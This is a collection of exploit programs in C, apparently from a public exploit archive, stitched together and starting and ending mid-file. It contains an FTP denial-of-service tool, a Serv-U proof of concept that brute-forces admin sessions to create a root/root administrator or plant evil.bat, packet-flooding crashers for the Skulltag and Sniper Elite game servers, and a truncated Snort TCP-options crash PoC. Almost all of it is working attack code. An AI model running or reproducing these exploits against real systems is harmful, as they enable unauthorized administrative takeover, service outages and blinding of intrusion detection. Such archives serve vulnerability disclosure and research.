       if(strstr(buffer,"421"))
               {
               printf("Access Denied on your arse..\n");
               exit(0);
               }
       }

   printf("Sending Pass - [%s]\n",pass);
   memset(buffer,0,sizeof(buffer));
   snprintf(buffer,sizeof(buffer), "PASS %s\r\n", pass);
   rc = send(sd,buffer, strlen(buffer), 0);

while(1)
       {
       rc=recv(sd,buffer,sizeof(buffer),0);
       if(strstr(buffer,"230")) break;
       if(strstr(buffer,"421"))
               {
               printf("Access Denied on your arse..\n");
               exit(0);
               }

       if(strstr(buffer,"530"))
               {
               printf("Access Denied: Login Incorrect!\n");
               exit(0);
               }
}

   memset(buffer,0,sizeof(buffer));
   snprintf(buffer,sizeof(buffer), "STOU AUX\r\n");
   rc = send(sd,buffer, strlen(buffer), 0);

   printf("Dos Sent\n");

   if(rc<0) {
     perror("cannot send data ");
     close(sd);
     exit(1);
   }
return 0;
}

// milw0rm.com [2004-09-13]
/*
  by Luigi Auriemma
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <time.h>
#include <inttypes.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define strnicmp    strncasecmp
    #define strnistr    strncasestr
#endif

#ifdef WIN32
    #define quick_thread(NAME, ARG) DWORD WINAPI NAME(ARG)
    #define thread_id   HANDLE
#else
    #define quick_thread(NAME, ARG) void *NAME(ARG)
    #define thread_id   pthread_t
#endif

thread_id quick_threadx(void *func, void *data) {
    thread_id   tid;
#ifdef WIN32
    DWORD   tmp;

    tid = CreateThread(NULL, 0, func, data, 0, &tmp);
    if(!tid) return(0);
#else
    if(pthread_create(&tid, NULL, func, data)) return(0);
#endif
    return(tid);
}

void quick_threadz(thread_id tid) {
#ifdef WIN32
    DWORD   ret;

    for(;;) {
        if(!GetExitCodeThread(tid, &ret)) break;
        if(!ret) break;
        Sleep(100);
    }
#else
    pthread_join(tid, NULL);
#endif
}

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        21
#define BUFFSZ      4096
#define ADMIN_PORT  43958



typedef struct {
    struct sockaddr_in  peer;
    int         sd;
    int         n;
    long long   start;
    long long   session;
    long long   end;
    thread_id   tid;
    int         done;
} args_t;



quick_thread(servu_scan, args_t *args);
int delimit(u8 *data);
int conna(struct sockaddr_in *peer);
int get_ftp_port(u8 *buff, u32 *ip);
int recv_ftp(int sd, u8 **rbuff);
int send_ftp(int sd, u8 *cmd, u8 *arg);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



static int  debug   = 0,
            exploit = 4;



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    long long   session;
    args_t  *args;
    int     sd,
            i,
            n,
            res     = -1;
    u16     port    = PORT;
    u8      *host,
            *user,
            *pass,
            *sess,
            *p,
            *l;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "Serv-U FTP <= 11.1.0.3 possible management console access " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 5) {
        printf("\n"
            "Usage: %s [-d/e] <session_start> <username> <password> <host> [port(%d)]\n"
            "\n"
            "- this proof-of-concept demonstrates the vulnerability by creating the user\n"
            "  root with password root having full access and privileges, watch the source\n"
            "  code and choose the other examples using the -e option\n"
            "- your user MUST have write privileges to exploit the vulnerability\n"
            "- session_start is the value from which starting the scanning, for example\n"
            "  9000 if both the server and the management console have been just started,\n"
            "  you can also specify multiple starts like 8000,9000,10000,11000 and the\n"
            "  tool will scan them in multi-threading increasing the speed\n"
            "- successfully tested with Windows XP and 2003 Server\n"
            "- it's not clear if Windows 7/2008 is vulnerable, Linux not tested\n"
            "\n"
            "Example: servu_1b 9000,12000,14000 myuser mypass example.com\n"
            "\n", argv[0], port);
        exit(1);
    }

    // just for my tests
    for(i = 1; i < argc; i++) {
        if(argv[i][0] != '-') break;
        if(!strcmp(argv[i], "-d")) {
            debug   = 1;
        } else if(!strcmp(argv[i], "-e")) {
            i++;
            exploit = atoi(argv[i]);
        }
    }

    sess = argv[i];
    user = argv[i + 1];
    pass = argv[i + 2];
    host = argv[i + 3];
    if((i + 4) < argc) port = atoi(argv[i + 4]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    printf(
        "- create a file containing the commands to send to the server\n"
        "- it must have the correct Session number so let's go with the scan\n");

    n = 0;
    for(i = 0; sess[i]; i++) {
        if(sess[i] == ',') n++;
    }
    n++;
    args = calloc(sizeof(args_t), n + 1);
    if(!args) std_err();

    p = sess;
    for(i = 0; *p; i++) {
        l = strchr(p, ',');
        if(l) *l = 0;
        session = atol(p);

        sd = conna(&peer);

        if(recv_ftp(sd, &p) < 0) goto quit;

        if(send_ftp(sd, "USER", user) < 0) goto quit;
        if(recv_ftp(sd, &p) < 0) goto quit;

        if(send_ftp(sd, "PASS", pass) < 0) goto quit;
        if(recv_ftp(sd, &p) < 0) goto quit;

        memcpy(&args[i].peer, &peer, sizeof(struct sockaddr_in));
        args[i].sd    = sd;
        args[i].n     = i;
        args[i].start = session;
        args[i].end   = -1;
        args[i].tid   = quick_threadx(servu_scan, &args[i]);

        if(!l) break;
        p = l + 1;
    }

    for(i = 0; args[i].tid; i++) {
        if(i) args[i - 1].end = args[i].start;
    }

    printf("\n- Current Session:\n");

    for(;;) {
        n = 0;
        for(i = 0; args[i].tid; i++) {
            if(args[i].done) n++;
        }
        if(n >= i) break;

        printf("\r");
        for(i = 0; args[i].tid; i++) {
            printf("  %-14"PRIu64"", args[i].session);
            if(debug) printf("\n");
        }
        sleep(ONESEC);
    }
    //for(i = 0; args[i].tid; i++) {
        //quick_threadz(args[i].tid);
    //}

    res = 0;

quit:
    //close(sd);
    if(res < 0) {
        printf("\nError: something wrong in the protocol or the connection\n");
    } else {
        printf("\n- done\n");
    }
    return(0);
}



quick_thread(servu_scan, args_t *args) {
    struct  sockaddr_in peer;
    long long   session;
    int     sd,
            s,
            len,
            hlen,
            ret,
            delperm = 1,
            res     = -1;
    u8      fname[64],
            http[1024],
            *buff,
            *p;

    sd = args->sd;

    buff = malloc(BUFFSZ + 1);
    if(!buff) std_err();

    if(send_ftp(sd, "TYPE", "I") < 0) goto quit;
    ret = recv_ftp(sd, &p);
    if(ret < 0) goto quit;
    if((ret / 100) != 2) goto quit;

    for(session = args->start;; session++) {
        if((args->end > 0) && (session >= args->end)) break;
        if(debug) printf("\n%"PRIu64"\n\n", session);

        args->session = session;
        //printf("\n- check Session %"PRIu64"\n\n", session);
        sprintf(fname, "bug%u.txt", (int)(time(NULL) + session));

        if(send_ftp(sd, "PASV", "") < 0) goto quit;
        ret = recv_ftp(sd, &p);
        if(ret < 0) goto quit;
        if((ret / 100) != 2) goto quit;

        memcpy(&peer, &args->peer, sizeof(struct sockaddr_in));
        peer.sin_port = htons(get_ftp_port(p, NULL));

        if(send_ftp(sd, "STOR", fname) < 0) goto quit;
        // receives the 1xx response for the ok

        /*
        UPLOAD HTTP REQUEST
        */

        hlen = 0;
        len  = 0;
        if(exploit == 1) {
            // 1: deny *.*.*.*
            len = sprintf(buff,
                "IP=*.*.*.*&Allow=0");

        } else if(exploit == 2) {
            // 2: upload an evil file: c:\evil.bat
            len = sprintf(buff,
                "-----------------------------1234567890\r\n"
                "Content-Disposition: form-data; name='File'; filename='evil.bat'\r\n"  // filename is ignored
                "Content-Type: application/octet-stream\r\n"
                "\r\n"
                "notepad.exe\r\n"
                "-----------------------------1234567890--\r\n");

        } else if(exploit == 3) {
            // 3: move a file from a location to another: c:\old.txt -> c:\evil.bat
            // fast but you need to know the full real path of your folder
            len = sprintf(buff,
                "new_path=/C:/evil.bat&original_path=/C:/old.txt");

        } else if(exploit == 4) {
            // 4: root user
            len = sprintf(buff, // Access=7967
                "LoginID=root&Password=root&HomeDir=/&LockInHomeDir=0&Access=8191&EmailAddress=&FullName=&RequirePasswordChange=0&AlwaysAllowLogin=1&ComboAdminType=System%%20Administrator&AdminType=2&");

        } else {
            printf("\nError: invalid test number (%d)\n", exploit);
            exit(1);
        }

        if(exploit == 1) {
            hlen = sprintf(http,
                "POST /Admin/XML/Result.xml?Session=%"PRIu64"&Command=AddObject&Object=CServer.0.IPAccess HTTP/1.1\r\n",
                session);

        } else if(exploit == 2) {
            hlen = sprintf(http,
                "POST /?Session=%"PRIu64"&Command=Upload&Dir=/C:/&TransferID=2&File=evil.bat HTTP/1.1\r\n"
                "Content-Type: multipart/form-data; boundary=---------------------------1234567890\r\n",
                session);

        } else if(exploit == 3) {
            hlen = sprintf(http,
                "POST /?Session=%"PRIu64"&Command=Rename&Dir=/C: HTTP/1.1\r\n",
                session);

        } else if(exploit == 4) {
            hlen = sprintf(http,
                "POST /Admin/XML/Result.xml?Session=%"PRIu64"&Command=ObjectCommand&Object=COrganization.241.CreateUser HTTP/1.1\r\n",
                session);
        }
        hlen += sprintf(http + hlen,
            //"Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
            "Host: 127.0.0.1:43958\r\n"
            "Content-Length: %d\r\n"
            "\r\n",
            len);

        s = conna(&peer);
        send(s, http, hlen, 0);
        send(s, buff, len,  0);
        close(s);

        for(;;) {
            ret = recv_ftp(sd, &p);
            if(ret < 0) goto quit;
            if((ret / 100) == 1) continue;
            if((ret / 100) != 2) goto quit;
            break;
        }

        sprintf(buff,
            "%d,%d,%d,%d,%d,%d",
            127, 0, 0, 1,
            (ADMIN_PORT >> 8) & 0xff, ADMIN_PORT & 0xff);
        if(send_ftp(sd, "PORT", buff) < 0) goto quit;

        //sprintf(buff, "|2|::1|%d|", ADMIN_PORT);
        //if(send_ftp(sd, "EPRT", ) < 0) goto quit;

        ret = recv_ftp(sd, &p);
        if(ret < 0) goto quit;
        if((ret / 100) != 2) goto quit;

        if(send_ftp(sd, "RETR", fname) < 0) goto quit;
        for(;;) {
            ret = recv_ftp(sd, &p);
            if(ret < 0) goto quit;
            if((ret / 100) == 1) continue;
            if(ret == 425) {
                printf("\n"
                    "Error: seems that the server isn't vulnerable:\n"
                    "       %s\n"
                    "\n",
                    p);
                goto quit;
            }
            //if((ret / 100) != 2) goto quit;
            // ignore errors and continue
            break;
        }

        if(delperm) {
            if(send_ftp(sd, "DELE", fname) < 0) goto quit;
            ret = recv_ftp(sd, &p);
            if(ret < 0) goto quit;
            if((ret / 100) != 2) delperm = 0;   //goto quit;    // don't check it because it's not important
        }
    }
    res = 0;
    quit:
    if(res < 0) printf("\nError: something wrong in the communication with the server\n");
    close(sd);
    args->done = 1;
    return(res);
}



int delimit(u8 *data) {
    u8      *p;

    for(p = data; *p && (*p != '\r') && (*p != '\n'); p++);
    *p = 0;
    return(p - data);
}



int conna(struct sockaddr_in *peer) {
    struct  linger  ling = {1,1};
    int     sd;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
    if(connect(sd, (struct sockaddr *)peer, sizeof(struct sockaddr_in)) < 0) std_err();
    return(sd);
}



int get_ftp_port(u8 *buff, u32 *ipx) {
    u32     ip;
    int     n1, n2, n3, n4, n5, n6,
            port;
    u8      *p;

    p = strrchr(buff, '(');
    if(!p) return(-1);
    if(sscanf(p + 1, "%d,%d,%d,%d,%d,%d", &n1, &n2, &n3, &n4, &n5, &n6) != 6) return(-1);
    ip = htonl((n1 << 24) | (n2 << 16) | (n3 << 8) | (n4));
    if((ip == INADDR_ANY) || (ip == INADDR_NONE)) {
        if(ipx) ip = *ipx;
    }
    if(ipx) *ipx = ip;
    port = (n5 << 8) | (n6);
    return(port);
}



int recv_ftp(int sd, u8 **rbuff) {
    static int  buffsz  = 0;
    static u8   *buff   = NULL;
    int     i,
            n,
            ret;

    do {
        for(i = 0;; i++) {
            if(i >= buffsz) {
                buffsz += 1024;
                buff = realloc(buff, buffsz + 1);
                if(!buff) std_err();
            }
            if(timeout(sd, 5) < 0) return(-1);
            if(recv(sd, buff + i, 1, 0) <= 0) return(-1);
            if(buff[i] == '\n') break;
        }
        buff[i] = 0;
        delimit(buff);
        if(debug) printf("  %s\n", buff);
        if(sscanf(buff, "%d%n", &ret, &n) != 1) return(-1);
    } while(buff[n] == '-');
    if(rbuff) *rbuff = buff;
    return(ret);
}



int send_ftp(int sd, u8 *cmd, u8 *arg) {
    static int  buffsz  = 0;
    static u8   *buff = NULL;
    int     len;

    if(!arg) arg = "";
    len = strlen(cmd) + 1 + strlen(arg) + 2;
    if(len >= buffsz) {
        buffsz = len + 256;
        buff = realloc(buff, buffsz + 1);
        if(!buff) std_err();
    }
    len = sprintf(buff, "%s %s\r\n", cmd, arg);
    if(debug) printf("- %s", buff);
    if(send(sd, buff, len, 0) <= 0) return(-1);
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "sv_huffman.c"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stristr strcasestr
    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        10666
#define BUFFSZ      8192    // max supported by the game (recvfrom)
#define TWAIT       5
#define ATTACKWAIT  2



u8 *skulltag_info(u8 *p);
void delimit(u8 *data);
int mycpy(u8 *dst, u8 *src);
int doom_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, int err);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, int err);
int putcc(u8 *data, int chr, int len);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int sec);
u32 resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    int     sd,
            len;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Skulltag <= v0.97D2-RC2 packet parsing DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n"
            "Note: works also on servers protected by password without knowing the keyword\n"
            "      but can't work if the IP is banned (except if packets are spoofed)\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port    = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), port);

    HuffInit();

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p = buff;
    p += putxx(p, 199,          32);
    p += putxx(p, 0x001f7fff,   32);
    len = doom_send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);
    if(len > 8) skulltag_info(buff);

    printf("\n- start to send a malformed connect packet each %d seconds:\n", ATTACKWAIT);
    for(;;) {
        p = buff;               // memset(buff, 0, BUFFSZ) was enough
        *p++ = 0;
        p   += mycpy(p, "");    // version (not needed)
        p   += mycpy(p, "");    // password (not needed)
        *p++ = 1;
        *p++ = 0;
        *p++ = 8;
        p   += mycpy(p, "");    // version hash (not needed)
        p   += putcc(p, 0, BUFFSZ - (p - buff));

        len = doom_send_recv(sd, buff, p - buff, NULL, 0, 1);
        sleep(ONESEC * ATTACKWAIT);
    }

    close(sd);
    return(0);
}



u8 *skulltag_info(u8 *p) {
    u32     dunno,
            ffffffff;
    int     i,
            wadnum;
    u8      *ver;

    printf("\n");
    p += getxx(p, &dunno,       32);
    p += getxx(p, &ffffffff,    32);
    ver   = strdup(p);
    printf("  version        %s\n",     p);     p += strlen(p) + 1;
    /* ID */                                    p += 4;
    printf("  hostname       %s\n",     p);     p += strlen(p) + 1;
    printf("  wad URL        %s\n",     p);     p += strlen(p) + 1;
    printf("  e-mail         %s\n",     p);     p += strlen(p) + 1;
    printf("  mapname        %s\n",     p);     p += strlen(p) + 1;
    printf("  max clients    %hhu\n",  *p);     p++;
    printf("  max players    %hhu\n",  *p);     p++;
    printf("  wads           ");
    wadnum = *p++;
    for(i = 0; i < wadnum; i++) {
        printf("%s ", p);                       p += strlen(p) + 1;
    }
    printf("\n");
    printf("  gametype       %hhu\n",  *p);     p++;
    /* dunno */                                 p += 2;
    printf("  gamename       %s\n",     p);     p += strlen(p) + 1;
    printf("  iwad           %s\n",     p);     p += strlen(p) + 1;
    printf("  password       %hhu\n",  *p);     p++;
    printf("  join password  %hhu\n",  *p);     p++;
    printf("  gameskill      %hhu\n",  *p);     p++;
    printf("  botskill       %hhu\n",  *p);     p++;
    /* the rest is useless */
    return(ver);
}



void delimit(u8 *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int mycpy(u8 *dst, u8 *src) {
    u8      *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int doom_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, int err) {
    int     len;
    u8      buff[BUFFSZ];

    HuffEncode(in, buff, insz, &len);
    len = send_recv(sd, buff, len, out ? buff : NULL, sizeof(buff), err);
    if(len > 0) HuffDecode(buff, out, len, &len);
    return(len);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "gssdkcr.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        3658
#define BUFFSZ      8192



u32 sniperel_pwd(u8 *pwd);
void fgetz(uint8_t *data, int len);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *buff, int chr, int len);
int putmm(u8 *buff, u8 *data, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u32     pass    = 0;
    int     sd,
            i,
            len,
            bug;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            cr[33],
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Sniper Elite Fake <= 1.0 multiple NULL pointers "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <bug> <host> [port(%hu)]\n"
            "\n"
            "Bugs:\n"
            "any number between 1 and 6\n"
            "\n", argv[0], port);
        exit(1);
    }

    bug  = atoi(argv[1]);
    host = argv[2];
    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    printf("\n- start testing:\n");
    for(;;) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        memset(cr, '0', 32);
        gssdkcr(cr, cr,  NULL);

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 0xfe,     8);
        p += putxx(p, 1,        8);
        p += putxx(p, htons(0), 16);
        p += putxx(p, htons(0), 16);
        p += putmm(p, cr,       32);

        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        while(buff[3] != 2) {
            len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
        }

        gssdkcr(cr, buff + 40,  0);

        p = buff;
        p += putxx(p, 0xfefe,   16);    // gssdk_header
        p += putxx(p, 0xfe,     8);
        p += putxx(p, 3,        8);
        p += putxx(p, htons(1), 16);
        p += putxx(p, htons(1), 16);
        p += putmm(p, cr,       32);
        p += putxx(p, 3,        16);    // gamever???
        p += putxx(p, 1,        16);
        p += putxx(p, pass,     32);

        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        while((buff[3] != 4) && (buff[3] != 5) && (buff[3] != 0x68)) {
            len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
        }

        if((buff[3] == 5) && (buff[8] == 9)) {
            close(sd);
            printf("\n- server is protected with password, insert the keyword: ");
            fgetz(buff, BUFFSZ);
            pass = sniperel_pwd(buff);
            continue;
        } else if((buff[3] == 5) && (buff[8] == 8)) {
            close(sd);
            printf(" server full ");
            for(i = 3; i; i--) {
                printf("%d\b", i);
                sleep(ONESEC);
            }
            continue;
        } else if(buff[3] == 0x68) {
            close(sd);
            printf(" disconnected");
            continue;
        } else if(buff[3] != 4) {
            close(sd);
            printf("\nError: you have been disconnected for unknown reasons (%02x %02x)\n", buff[3], buff[8]);
            exit(1);
        }

        switch(bug) {
            case 1: bug = 0x1d;     break;
            case 2: bug = 0x1e;     break;
            case 3: bug = 0x6f;     break;
            case 4: bug = 0x86;     break;
            case 5: bug = 0x87;     break;
            case 6: bug = 0x88;     break;
            default: {
                printf("\nError: invalid number of bug to test\n");
                exit(1);
            }
        }

        printf("\n- send malformed packet 0x%02x\n", bug);
        p = buff;
        p += putxx(p, bug,  8);
        p += putxx(p, 0x42, 8);
        if(bug == 0x6f) {
            p += putcc(p, 0xff, 100);
        } else {
            p += putcc(p, 0x00, time(NULL) % 64);  // this is not needed
        }

        len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);
        for(i = 0; i < 16; i++) {
            len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 0);
            if(len < 0) break;
        }
        break;
    }

    printf("\n- check the server manually for verifying if it's vulnerable or not\n");
    close(sd);
    return(0);
}



void fgetz(u8 *data, int len) {
    u8      *p;

    fgets(data, len, stdin);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry,
            len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) goto quit;
        return(0);
    }
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



u32 sniperel_pwd(u8 *pwd) {
    u32     ret;
    int     i;
    u8      c;

    ret = 0;
    for(i = 0; pwd[i]; i++) {
        c = pwd[i];
        if((c >= 'A') && (c <= 'Z')) c += 32;
        if(c == '\\') c = '/';
        ret = (ret * 31) + c;
    }
    return(ret);
}



int putcc(u8 *buff, int chr, int len) {
    memset(buff, chr, len);
    return(len);
}



int putmm(u8 *buff, u8 *data, int len) {
    strncpy(buff, data, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/12084/info

Snort is reported prone to a remote denial of service vulnerability. The vulnerability is reported to exist in the DecodeTCPOptions() function of 'decode.c', and is as a result of a failure to sufficiently handle malicious TCP packets.

A remote attacker may trigger this vulnerability to crash a remote Snort server and in doing so may prevent subsequent malicious attacks from being detected. 

/*
* snort >= 2.1.3 TCP/IP options bug proof of concept
* by Marcin Zgorecki
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#define DADDR	"127.0.0.1"

int main(int argc, char **argv)
{
int s;
/* TCP MSS option, should be: "\x02\04\xff\xff" */
char opts[] = "\x02\x00\xff\xff";
char datagram[64];
struct sockaddr_in addr;
struct ip *ip = (struct ip *) datagram;
struct tcphdr *tcp;

memset(&datagram, 0, sizeof(datagram));
addr.sin_addr.s_addr = inet_addr(DADDR);
addr.sin_port = htons(123);
addr.sin_family = AF_INET;

ip->ip_hl = 5;
ip->ip_v = 4;
ip->ip_tos = 0;
ip->ip_id = 0;
ip->ip_off = 0;
ip->ip_ttl = 64;
ip->ip_p = IPPROTO_TCP;
ip->ip_len = 44;
ip->ip_sum = 0;
ip->ip_dst.s_addr = addr.sin_addr.s_addr;
ip->ip_src.s_addr = inet_addr("1.2.3.4");

tcp = (struct tcphdr *) (datagram + (ip->ip_hl << 2));
tcp->source = htons(321);
tcp->dest = addr.sin_port;
tcp->seq = 0;
tcp->ack = 0;
tcp->res1 = 0;
tcp->doff = 6;
tcp->syn = 0;
tcp->window = 0x1000;
tcp->check = 0;
tcp->urg_ptr = 0;

memcpy(datagram + 40, opts, sizeof(opts));

